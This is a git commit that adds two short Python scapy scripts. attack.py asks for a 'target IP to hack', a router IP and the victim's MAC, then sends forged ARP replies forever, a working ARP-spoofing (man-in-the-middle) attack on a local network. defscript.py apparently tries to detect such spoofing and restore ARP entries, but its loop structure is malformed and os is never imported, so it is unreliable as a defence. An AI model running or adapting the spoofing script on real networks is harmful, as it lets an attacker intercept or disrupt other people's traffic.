7cc5af0f40f776b69279bea4b26bb1d69fa6d493
ta2313 <90862240+ta2313@users.noreply.github.com>
2021-11-26 15:02:15 -0500

    Add files via upload

---
+++ attack.py
@@ -0,0 +1,20 @@
+from scapy.all import *
+from subprocess import call
+import time
+
+op=2
+victim=raw_input('Enter the target IP to hack: ')
+victim=victim.replace(" ","")
+
+spoof=raw_input('Enter the routers IP *SHOULD BE ON SAME ROUTER*: ')
+spoof=spoof.replace(" ","")
+
+mac=raw_input('Enter the target MAC to hack: ')
+mac=mac.replace("-",":")
+mac=mac.replace(" ","")
+
+arp=ARP(op=op,psrc=spoof,pdst=victim,hwdst=mac)
+
+while 1:
+send(arp)
+time.sleep(2)
---
+++ defscript.py
@@ -0,0 +1,24 @@
+#!/usr/bin/env/python
+from scapy.all import *
+import subprocess
+from getmac import get_mac_address
+router_ip="192.168.1.1"
+current_ip=raw_input("enter your ip")
+a=ARP(op=1,pdst="192.168.1.1")
+b=sr1(a)
+b[0].show()
+current_mac=raw_input("enter mac from above packet display :")
+original_mac=b.hwsrc
+while True:
+          current_mac=get_mac_address(ip="192.168.1.1")
+          if current_mac!=original_mac:
+                           
+                            helper=ARP(op=2,pdst=current_ip,psrc=router_ip)
+                            send(helper)
+                            fix_router=ARP(op=2,pdst="192.168.1.1")
+                            send(fix_router)
+                            os.system("arp -d 192.168.1.1")
+                            os.system("ping 192.168.1.1")
+else:
+    sleep(2)
+
